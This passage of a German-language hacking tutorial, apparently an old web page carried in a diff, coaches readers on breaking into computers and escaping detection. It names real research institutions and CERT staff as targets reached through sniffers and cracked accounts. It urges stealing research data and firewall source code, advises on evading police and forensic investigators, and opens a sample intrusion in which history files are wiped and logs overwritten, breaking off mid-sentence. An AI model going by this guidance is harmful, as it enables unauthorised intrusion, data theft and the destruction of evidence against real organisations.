+das gleiche Spiel: TICK tauscht Jochen's Key gegen seinen eigenen aus und
+sendet ihn an Harald</li>
+
+<li>
+Harald bemerkt nichts und beginnt mit der verschluesselten Kommunikation.
+Zur Verschluesselung benutzt er natuerlich TICK's Public-Key</li>
+
+<li>
+TICK empfaengt die Nachricht, dechiffriert sie mit seinem Secret-Key und
+erhaelt den Klartext (der natuerlich aufgezeichnet wird)</li>
+
+<li>
+TICK verschluesselt den Klartext mit dem Public-Key von Jochen, damit Jochen
+die Nachricht decrypten kann und sendet den Ciphertext an Jochen</li>
+
+<li>
+Jochen empfaengt die Nachricht und dechiffriert sie mit seinem Secret-Key</li>
+
+<li>
+Jochen antwortet auf Harald's Nachricht</li>
+
+<li>
+das Spiel geht von Vorne los, nur das in umgekehrter Richtung natuerlich
+Harald's Public-Key verwendet werden muss</li>
+
+<li>
+TICK lacht sich ins Faeustchen ;)</li>
+</ul>
+TICK ist es in seiner Position nicht nur moeglich die Daten im Klartext
+zu lesen, sondern er kann auch Daten einfuehgen und loeschen. Er koennte
+sich z. Bsp. als Harald ausgeben und Jochen diverse Fragen stellen um ihm
+so geheime Informationen aus der Nase zu ziehen und die Antworten loeschen,
+damit sie Harald nie zu Gesicht bekommt.
+<br><i>MIM Attacken </i>koennen durch Signaturen fuer die Public-Keys (z.B.
+eines <i>KDC</i>s) oder durch das <i>INTERLOCK-Protokol </i>erschwert/verhindert
+werden... aber da es sich hier nicht um ein Security-Paper handelt, werde
+ich nicht naeher darauf eingehen. ;)
+<p>Ich moechte noch kurz auf eine andere Art von Attacke eingehen, die
+z.B. bei <i>SecureShell </i>funktioniert.
+<br>Undzwar wenn der Public-Key einer Client-Server Verbindung bekannt
+ist, dann kann ein Angreifer mit diesem Key eigene Pakete verschluesseln
+und in den Stream einfuehgen. Somit ist es z.B. moeglich Befehle an eine
+Shell zu schicken.
+<p>Nungut, um ehrlich zu sein werden die meisten Hacks mit Hilfe von Remote-Exploits
+und Sniffern gemacht.
+<p>Abundzu solltest du auch 'n paar Hacker-Mags lesen... leider sind die
+meisten echter Schrott, was ich dir empfehlen koennte ist <a href="http://www.phrack.com">Phrack</a>
+,&nbsp; <a href="http://thc.inferno.tusculum.edu">THC-Mag</a> ... naja,
+und vielleicht noch das TFC- oder CRH-Mag.
+<p>Ach ja, es gibt da noch eine Methode... haette's fast vergessen. Ich
+nenne sie "Verwundbarkeit aufgrund von Beziehungen"... naja. Ok, nehmen
+wir mal an, du willst das DFN-CERT hacken, kommst aber nicht rein weil
+die ihre Rechner natuerlich gut gesichert haben. Nun musst du ein paar
+Ueberlegungen ueber die Beziehungen des CERT zu anderen Domains machen.
+Hier ein Bsp. ('-' Ueberlegung und '->' Folgerung):
+<pre>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; das CERT hat eine Subdomain im Netz des DFNs (Deutsches Forschungs Netz)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ->&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Bez. zu grossen Forschungseinrichtungen wei z.B. das DESY, die
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Frauenhofer Gesellschaft, der GMD et cetera
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sniffer installieren und/oder gecrackte Accounts beim DFN testen.
+-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; das DFN-CERT liegt in Hamburg
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ->&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Somit besteht eine Beziehung zur Uni/FH Hamburg
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d.h. wenn du die Uni/FH Hamburg hackst kannst du einen Sniffer
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; auf die DFN(-CERT)-Domain ansetzen
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (und um ehrlich zu sein wird das DFN-CERT auch von Prof.s der
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Uni-HH geleitet (z.B.: Wolfgang Ley))
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ->&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Das DESY ist ebenfalls in HH!
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hiermit besteht schon eine doppelte Bez. zum DESY... also es lohnt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sich hier mal vorbei zu sehen. ;)
+-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; und noch ein paar Kleinigkeiten mehr...</pre>
+Bei Firmen sind Joint-Ventures noch interessant.
+<br>&nbsp;
+<p><a NAME="a5"></a>
+<h3>
+<font color="#990099">Wie rette ich meinen Arsch?</font></h3>
+
+<center><img SRC="pic2.gif" ></center>
+
+<p>Zu diesem Thema werde ich nicht viel sagen, ausser, dass du <a href="htcyt.html">How
+to cover your tracks</a> und&nbsp; <a href="http://www.thc.org">Anonymous
+Unix</a>&nbsp; von van Hauser/THC lesen solltest. Ich kann nur noch hinzufuegen:
+<ul>
+<li>
+Unterschaetze niemals die Admins und die Bullen.</li>
+
+<li>
+Wenn du nicht wirklich gut bist, dann lass' die Finger vom CERT, Firewalls
+etc... du bekommst nur Aerger.</li>
+
+<li>
+Informiere dich ueber die Gesetze deines Landes (wenn du in Dtld. wohnst,
+dann wirf mal einen Blick in's&nbsp; <a href="http://www.thc.org">THC-Mag
+4</a> )!</li>
+
+<li>
+Bereite dich psychisch und technisch auf eine Hausdurchsuchung vor. Wenn
+die Bullen vor der Tuer stehen und du verlierst die Nerven, dann wirst
+du viele Fehler machen, die nicht haetten sein muessen.</li>
+
+<li>
+Zerstoere nichts und klaue keine Firmengeheimnisse (es sei denn sie sind
+fuer Hacker interessant).</li>
+
+<li>
+Loesche alle Komponenten deiner Hacking-Tools und Exploits mit <b>srm</b>
+o.ae., damit man sie nicht durch rohes Auslesen der HD rekonstruieren kann.</li>
+
+<li>
+Stichwort e-Forensic: Auch bei dir wird im Laufe der Zeit die Routine eintreten
+und du gewoehnst dir an, bestimmte Befehle/Files/Exploits immer in der
+selben Reihenfolge zu benutzen und damit hinterlaesst du einen subtilen
+aber existenten "Fingerabdruck". Aus diesem Grund empfehle ich dir dringend
+die a-/mtime Time der benutzten Files zu veraendern - am Besten natuerlich
+nicht zu veraendern, also die alte Zeit zu setzen.</li>
+
+<li>
+Dasselbe gilt auch fuer die Homedirec.s der Accounts, die du benutzt hast.
+Ein <b>ls -ald /home/*</b> ist genauso effektiv wie der Aufruf von <b>last</b>.</li>
+
+<li>
+Du solltest dir ein Programm schreiben (oder benutze <b>indent</b>), das
+das Format deiner Source Codes voellig aufhebt, sodass z.B. dein Source
+Code nur aus einer langen Zeile besteht. Es existieren naemlich mehrere
+Security Papers, die sich damit beschaeftigen den Autor eines Programs
+anhand seines Programmierstils zu erkennen (wurde auch beim <i>Internet
+Worm</i> von Robert T. Morris angewandt; so konnte festgestellt werden,
+dass der Bufferoverflow Exploit fuer <b>fingerd</b> nicht urspruenglich
+von Morris stammt). Desweiteren solltest du keine extravaganten Bezeichnungen
+bei der Benennung deiner Funktionen und Variablen waehlen. Das nuetzt natuerlich
+alles nichts, wenn du deinen Handle in den Quellcode schreibst. ;)</li>
+</ul>
+<a NAME="a6"></a>
+<h3>
+<font color="#990099">Ein paar Gedanken zum Sein eines Hackers</font></h3>
+
+<center><img SRC="pic3.gif" ></center>
+
+<p>Naja, das Bild ist mir etwas zu schwarz-weiss (und das hat nichts mit
+der Farbe zu tun).
+<br>In meinen Augen vereinigt ein Hacker beide "Personen" (No Risk No Fun).
+<p>Ein paar Regeln solltest du immer im Hinterkopf behalten:
+<ul>
+<li>
+Zerstoere keine Rechner/Netze</li>
+
+<li>
+keine Erpressung</li>
+
+<li>
+keine Industriespionage</li>
+
+<li>
+hack nicht einfach wie wild 1000 Rechner nur weil es einfach ist, nimm
+mal 'n paar Herausforderungen an</li>
+
+<li>
+und noch 'ne Menge anderer Kram der gegen die Ehtik eines Hackers verstoesst,
+mir jetzt aber nicht einfaellt...</li>
+</ul>
+<a NAME="a7"></a>
+<h3>
+<font color="#990099">Yeah, time to become 31337.</font></h3>
+Ok, irgendwann wird das alles langweilig und/oder die Domain, in die du
+unbedingt hinein willst ist dicht wie 'n Bunker.
+<br>Jetzt wird es Zeit seine eigenen Tools und Remote-Exploits zu entwickeln.
+<p>Dazu ist folgendes noetig:
+<ol>
+<li>
+natuerlich solltest du fit im Programmieren unter Unix sein (C, C++, Perl,
+Shell-Spachen).</li>
+
+<li>
+du solltest die Exploits (von Bugtraq etc) genau studieren und einen Ueberblick
+und ein Verstaendnis fuer die Sicherheit von Programmen bekommen</li>
+
+<br>das 'Nach-programmieren' von Exploits uebt ungemein ;)
+<li>
+der Umgang mit Tools wie <b>strace</b>,<b> ltrace</b>, <b>gdb</b>, <b>purify</b>
+&amp; Co. sollte dir vertraut sein, damit du auch ohne Source Code Bugs
+in Programmen eruieren kannst</li>
+
+<li>
+besorge dir diverse Docs ueber das sichere Programmieren von Unix-Software
+<a href="http://www.sun.com/sunworldonline/swol-04-1998/swol-04-unixsecurity.html">http://www.sun.com/sunworldonline/swol-04-1998/swol-04-unixsecurity.html
+</a><a href="http://www.sun.com/sunworldonline/swol-04-1998/swol-04-security.html">http://www.sun.com/sunworldonline/swol-04-1998/swol-04-security.html
+</a><a href="http://www.homeport.org/~adam/review.html">http://www.homeport.org/~adam/review.html
+</a><a href="http://olympus.cs.ucdavis.edu/~bishop/secprog.html">http://olympus.cs.ucdavis.edu/~bishop/secprog.html
+</a><a href="http://www.research.att.com/~smb/talks/odds.[ps|pdf]">http://www.research.att.com/~smb/talks/odds.[ps|pdf]
+</a><a href="http://www.pobox.com/~kragen/security-holes.txt">http://www.pobox.com/~kragen/security-holes.txt</a></li>
+
+<li>
+und vergiss nicht, so viel Source Codes wie moeglich von den verschiedenen
+Unix-Derivaten zu bekommen, die du gehackt hast</li>
+
+<br>wenn du Glueck hast ist noch die Installations-CD im CD-Rom (ich hoffe
+mit Sources) ;)
+<br>ja, und weil kopieren einfacher ist als selber schreiben, solltest
+du bedenken, das Programme, die unter z.B. Linux 'nen Bug haben hoechstwahrscheinlich
+auch unter *BSD buggy sind (ok, mit 99,9%iger Ausnahme von OpenBSD)...
+<br>und solltest du mal kein Exploit von 'nem bereits gefixten Bug haben,
+dann besorge dir das Patch und versuche anhand dessen dein Exploit zu coden
+(es ist zwar bloed, dass es schon bekannt ist, aber die meisten Admins
+haben mehr Probleme damit ihr Netz am Laufen zu halten als die Bugs in
+irgendwelchen Programmen zu patchen)</ol>
+Du solltest niemanden die Moeglichkeit geben ein Profil von dir anzufertigen,
+dazu ist folgendes zu beachten
+<ol>
+<li>
+Halte nur zu <b>sehr</b> gut befreundeten Hackern kontakt.</li>
+
+<br>Wenn du mit ihnen Emails austauscht, dann sollten sie natuerlich mit
+PGP encrypted sein, zu einem anonymen Account gehen (benutze keinen gehackten
+Account, besser&nbsp; <a href="http://www.hotmail.com">www.hotmail.com</a>,
+<a href="http://www.yahoo.com">www.yahoo.com</a>,
+<a href="http://www.gmx.net">www.gmx.net</a>&nbsp;
+(mit POP!!!)... - der Rechner sollte natuerlich im Ausland stehen, die
+Ermittlungsbehoerden schrecken haeufig vor dem Papierkrieg zurueck, sind
+auch nur Menschen) unter Verwendung eines speziellen Handles, den du fuer
+nichts anderes verwendest.
+<br>Du solltest den Handle/Account unregelmaessig aendern und natuerlich
+auch ein neues PGP seckey-pubkey Paar erstellen (auch die Passphrase aendern!).
+<br>Achte darauf, dass dein PGP Key mit mindestens 2048 bit Schluessellaenge
+generiert wird, ausserdem solltest du aus Sicherheitsgruenden nicht die
+5.x Version benutzen, sondern bei die alten 2.6.x Version!!!
+<li>
+Wenn du dich unbedingt auf den einschlaegigen IRC Channels rumtreiben willst,
+dann aendere immer deinen Nick und wechsel auch deinen Host (da viele Rechner
+im Internet keine <b>irc</b>-Clients installiert haben, solltest du Relays
+benutzen (oder auch IP Source Routing und IP Spoofing, probier&acute;s
+aus)).</li>
+
+<br>Ich weiss, dass das aendern des Nicks nicht so schoen ist, weil man
+dadurch keine Reputation bei der breiten Masse bekommt; aber Reputation
+ist so toetlich wie nuetzlich (andere Hacker akzeptieren dich sofort und
+sind etwas geschwaetziger dir gegenueber - um sich zu profilieren - aber
+wenn du erstmal so weit bist, dass du deine eigenen Exploits schreibst,
+dann bist du auf den groessten Teil der Hacker sowieso nicht mehr angewiesen,
+und den interessanten Rest triffst du nicht so einfach im IRC).
+<br>Nuetzlich sind hier sogenannte Redirector, die eine TCP Verbindung
+weiterleiten, was auch schon in der Hinsicht interessant ist, wenn man
+sich vor Attacken von anderen Hacker schuetzten will, wenn man auf dem
+IRC zuviel Aerger verursacht hat ;-))
+<br>Auch hier koenntest du natuerlich einen speziellen Account fuer's IRC
+benutzen.
+<br>Die Polizei fertig nachweislich Logs von den IRC Chats an. (Netguru
+haben sie so gefasst, und der war psychisch nicht darauf vorbereitet, haha)
+<br>Ach, lass einfach die Finger vom IRC.
+<br>Es waere cool, wenn sich mal `n paar von euch die Zeit nehmen wuerden
+um ein Crypto-IRC auf Basis von SSH aufzubauen.</ol>
+Ok, desweiteren solltest du dir Gedanken machen woher du den Source Code
+von kommerziellen Betriebssystemen bekommen koenntest. Die Quellen von
+Linux, *BSD und Solaris kannst du zum Glueck legal erwerben; Microsoft
+gibt den Source Code von NT an Unis weiter.
+<br>Jetzt musst du dich daran machen und versuchen Zugriff auf den Quellcode
+von diversen Firewalls und Intrusion-Detection-Systems zu erlangen - dabei
+helfen dir die privaten Exploits der Betriebssysteme deren Sourcen du gesammelt
+hast. Der Source Code der Gauntlet Firewall ist gegen etwas Geld zu haben
+(aber AFAIK nicht mehr von den neuen Version), davon mal abgesehen basiert
+der Code einiger Proxies auf dem des TIS-FWTK (was hingegen nichts kostet).
+<br>Erfahrungen mit dem Aufbau der gaengigen Firewall Produkte ist unerlaesslich.
+Du solltest als Nebenjob oder natuerlich auch hauptberuflich im IT-Sicherheitsbereich
+arbeiten um so legal und kostenlos Netzwerksicherheits-Systeme evaluieren
+zu koennen und somit deren Schwachstellen zu kennen.
+<br>Halte Ausschau nach Universitaeten und Forschungsinstitute, die im
+Computersicherheitsbereich Forschung betreiben und kopiere dir die Forschungsdaten,
+nachdem du sie gehackt hast. Es ist zwar nicht sehr wahrscheinlich, dass
+eine Doktorarbeit kommerziell vermarktet wird, aber der Typ, der die Arbeit
+verfasst hat, wird einen gut bezahlten Job bei einer grossen Firma bekommen
+und dort seine Systeme (weiter-)entwickeln. Diese Systeme basieren mit
+hoher Wahrscheinlichkeit zum grossen Teil auf Algorithmen und Quelltexten
+seiner Doktorarbeit... ;)
+<br>Nunja, grosse Forschungeinrichtungen werden versuchen, ihre System
+auf den Markt zu bringen (evtl. mit Hilfe einer groesseren Firma) und wenn
+man dann den Source eines weit verbreiteten Produkts besitzt, dann ist
+man Koenig. Das Lustige ist, dass solche Forschungsscheunen Studenten beschaeftigen
+um Geld zu sparen, und die haben meistens keine Ahnung von sicherer Programmierung
+oder/und bewahren Forschungsdaten, mit denen sie arbeiten muessen, ungeschuetzt
+auf ihren Windows-PCs auf.
+<br>In den USA arbeiten die Universitaeten oft mit der Regierung zusammen,
+dasselbe gilt fuer Japan, dort arbeiten Universitaeten, Konzerne und die
+Regierung handinhand - naja, was haetten wir sonst von unseren BORGs erwartet?
+Dieser Umstand macht es dir einfach die Firewalls der *.gov's und *.com's
+zu hacken.
+<br>Ich hoffe, du hast jetzt eine Vorstellung davon bekommen, was so abgeht...
+<p>Erfahrungen mit (digitalen) Tk-Anlagen&nbsp; und deren Sicherheitsproblematik
+ist unabdingbar. Es nuetzt nicht viel, wenn du eienen externen Remote-Zugang
+zu einer Wartungseinheit hackst und dann nichts damit anzufangen weisst.
+<p>Bla, bla, bla... genug mit dem "Kochbuch"!
+<br>&nbsp;
+<p><a NAME="a8"></a>
+<h3>
+<font color="#993399">Ein Blick ueber die Schulter</font></h3>
+<font color="#000000">Ok, beim Zugucken lernt man am Schnellsten.</font>
+<br><font color="#000000">Also hier folgt ein Beispielhack mit den entsprechenden
+Kommentaren.</font>
+<br><font color="#000000">Wir gehen mal davon aus, dass wir den Account
+gesniffed (oder sonstwie bekommen) haben und dass wir alle Massnahmen durchgefuehrt
+haben um unsere Praesenz auf dem Ausgangsrechner zu verbergen.</font> Desweiteren
+wird dir ganze Session natuerlich durch unser Terminalprogramm (kein IP)
+aufgezeichnet.
+<p><font color="#FF0000">source > finger @victim.domain.com</font>
+<br><font color="#FF0000">[]</font>
+<p><font color="#FF0000">Welcome to Linux version 2.0.33 at victim.domain.com
+!</font>
+<p><font color="#FF0000">&nbsp; 6:21pm&nbsp; up&nbsp; 6:10h,&nbsp; 0 users,&nbsp;
+load average: 0.28, 0.11, 0.10</font>
+<p><font color="#FF0000">&nbsp; No one logged in.</font>
+<p><font color="#FF0000">source ></font>
+<p><font color="#000000">So ka, es scheint keiner eingeloggt zu sein, aber
+wir werden es auf dem Rechner noch genauer ueberpruefen.</font>
+<p><font color="#FF0000">source > echo $SHELL</font>
+<br><font color="#FF0000">/bin/bash</font>
+<br><font color="#FF0000">source > unset USER</font>
+<br><font color="#FF0000">source > unset MAIL</font>
+<br><font color="#FF0000">source > unset HOME</font>
+<br><font color="#FF0000">source > unset PRINTER</font>
+<br><font color="#FF0000">source > telnet</font>
+<br><font color="#FF0000">telnet > o victim.domain.com</font>
+<br><font color="#FF0000">Trying 10.255.0.1...</font>
+<br><font color="#FF0000">Connected to localhost.</font>
+<br><font color="#FF0000">Escape character is '^]'.</font>
+<p><font color="#FF0000">Linux 2.0.33 (victim.domain.com) (ttyp4)</font>
+<br>&nbsp;
+<p><font color="#FF0000">victim login: johnny</font>
+<br><font color="#FF0000">Password:</font>
+<br><font color="#FF0000">Have a lot of fun...</font>
+<br><font color="#FF0000">Last login: Wed Jun 17 19:16:07 on tty3.</font>
+<br><font color="#FF0000">No mail.</font>
+<p>Die Environmentvariablen USER, MAIL, HOME, PRINTER und UID (wenn du
+unter X arbeitest, dann vergiss die Variablen XTERM und DISPLAY nicht)
+werden von <b>telnet</b> zu <b>telnetd</b> uebertragen, somit kann ein
+Admin Informationen ueber den Hackeraccount bekommen (z.B. mit <b>noshell</b>)
+was wir natuerlich nicht wollen. Aus diesem Grund loeschen wir diese Werte,
+leider ist UID read-only und kann nicht von uns geaendert werden - evtl.
+geht's ueber ein C-Program, welches ein voellig neues Environment konstruiert
+und anschliessend <b>telnet</b>, eine Shell oder was auch immer exec'd,
+ich hab' keine Ahnung.
+<br>Ein Bestandteil des Protokols der r-Tools (<b>rlogin</b>, <b>rcp</b>,
+<b>rsh
+</b>bzw.
+<b>remsh</b>
+etc) ist der lokale Username - es ist also von der Verwendung dieser Tools
+abzuraten.
+<br><font color="#000000">Vielleicht hast du dich gefragt warum wir <b>telnet</b>
+interaktiv benutzen, nungut, der Grund ist einfach: damit </font>verhindern
+wir, dass der Zielrechner in der Prozessliste von &acute;source' auftaucht.
+<p><font color="#FF0000">victim:/home/johnny > rlogin victim</font>
+<br><font color="#FF0000">Password:</font>
+<br><font color="#FF0000">Have a lot of fun...</font>
+<br><font color="#FF0000">Last login: Wed Jun 17 19:16:07 on ttyp4 from
+source.ass.com.</font>
+<br><font color="#FF0000">No mail</font>
+<br><font color="#FF0000">victim:/home/johnny > exit</font>
+<br><font color="#FF0000">rlogin: connection closed.</font>
+<br><font color="#FF0000">victim:/home/johnny > csh -f</font>
+<br><font color="#FF0000">victim % ls -altr</font>
+<br><font color="#FF0000">[...]</font>
+<br><font color="#FF0000">-rw-------&nbsp;&nbsp; 1 test&nbsp;&nbsp;&nbsp;&nbsp;
+users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 450 Jul&nbsp; 6 11:38
+.bash_history</font>
+<br><font color="#FF0000">victim % unset HISTFILE</font>
+<br><font color="#FF0000">victim % cat /dev/zero > .bash_history</font>
+<br><font color="#FF0000">^C</font>
+<br><font color="#FF0000">victim % rm .bash_history</font>
+<p><font color="#000000">Ja, alles was wir hier gemacht haben ist unsere
+Spuren etwas zu verschleiern und das ohne root-Rechte. Durch <b>rlogin</b>
+(<b>telnet</b> geht natuerlich auch) koennen wir unseren Lastlog-Entry
+ueberschreiben und was absolut wichtig ist, ist dass das History-File geloescht
+wird; und um kein neues File zu erzeugen rufen wir die <b>csh</b> auf,
+die per default kein History-File erstellt (wenn der User die <b>csh</b>
+benutzt kannst du auch die Bourne-Shell <b>sh</b> verwenden, aber vorsicht,
+denn unter Linux z.B. ist </font><font color="#33FF33">/bin/sh</font><font color="#000000">ein
+<i>Link
+</i>auf
+</font><font color="#33FF33">/bin/bash</font><font color="#000000">).</font>
+<br><font color="#000000">Das History-File musst du unbedingt am Anfang
+deiner Sitzung loeschen, denn wenn der Admin dich bemerkt und einen <i>Hard-Link
+</i>auf
+das File macht, dann bleiben die Daten auf der HD erhalten und der Admin
+kann ueber den <i>Hard-Link</i> darauf zugreifen.</font>
+<br><font color="#000000">Falls <b>login</b> SUID root installiert ist,
+hast du die Moeglichkeit auch dein </font><font color="#33FF33">utmp</font><font color="#000000">[</font><font color="#33FF33">x</font><font color="#000000">]-Entry
+zu ueberschreiben, dazu</font> <font color="#000000">rufst du einfach <b>login</b>
+auf und loggst dich ein.</font>
+<p><font color="#FF0000">victim % w</font>
+<br>&nbsp;<font color="#FF0000">&nbsp; 6:54pm&nbsp; up&nbsp; 6:43h,&nbsp;
+1 users,&nbsp; load average: 0.08, 0.09, 0.08</font>
+<br><font color="#FF0000">USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TTY&nbsp;&nbsp;&nbsp;
+LOGIN@&nbsp; IDLE&nbsp;&nbsp; JCPU&nbsp;&nbsp; PCPU&nbsp; WHAT</font>
+<br><font color="#FF0000">johnny&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ttyp4&nbsp;&nbsp;
+6:35pm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0:01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0:00&nbsp;&nbsp;&nbsp;&nbsp; 0:00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+w</font>
+<p><font color="#FF0000">victim % ps au</font>
+<br><font color="#FF0000">USER&nbsp;&nbsp; PID %CPU %MEM&nbsp;&nbsp; VSZ&nbsp;&nbsp;
+RSS&nbsp; TT STAT&nbsp; START&nbsp;&nbsp; TIME COMMAND</font>
+<br><font color="#FF0000">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 144&nbsp;&nbsp;&nbsp;
+0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 24&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 12:12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0:00&nbsp;&nbsp;&nbsp;&nbsp; mingetty</font>
+<br><font color="#FF0000">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 145&nbsp;&nbsp;&nbsp;
+0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8&nbsp;&nbsp;&nbsp;
+2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+12:12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0:00&nbsp;&nbsp;&nbsp;&nbsp;
+mingetty</font>
+<br><font color="#FF0000">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 146&nbsp;&nbsp;&nbsp;
+0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 28&nbsp;&nbsp;&nbsp; 3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 12:12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0:00&nbsp;&nbsp;&nbsp;&nbsp; mingetty</font>
+<br><font color="#FF0000">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 147&nbsp;&nbsp;&nbsp;
+0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;
+4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SW&nbsp;&nbsp;&nbsp; 12:12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0:00&nbsp;&nbsp;&nbsp;&nbsp; mingetty</font>
+<br><font color="#FF0000">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 148&nbsp;&nbsp;&nbsp;
+0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;
+5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SW&nbsp;&nbsp;&nbsp; 12:12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0:00&nbsp;&nbsp;&nbsp;&nbsp; mingetty</font>
+<br><font color="#FF0000">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 149&nbsp;&nbsp;&nbsp;
+0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;
+6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SW&nbsp;&nbsp;&nbsp; 12:12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0:00&nbsp;&nbsp;&nbsp;&nbsp; mingetty</font>
+<br><font color="#FF0000">johnny 1641&nbsp;&nbsp;&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+4.6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1748&nbsp;&nbsp; 1064&nbsp; p4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 18:35&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0:00&nbsp;&nbsp;&nbsp;&nbsp; -bash</font>
+<br><font color="#FF0000">johnny 1691&nbsp;&nbsp;&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+1.7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 928&nbsp;&nbsp;&nbsp; 408&nbsp;&nbsp;
+p4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; R&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+18:57&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0:00&nbsp;&nbsp;&nbsp;&nbsp;
+ps au</font>
+<p><font color="#000000">Hier ueberpruefen wir nochmal genau ob nicht doch
+ein Admin eingeloggt ist, der <b>fingerd</b> modifiziert oder seine Eintraege
+aus </font><font color="#33FF33">w</font><font color="#000000">/</font><font color="#33FF33">utmp</font><font color="#000000">[</font><font color="#33FF33">x</font><font color="#000000">]
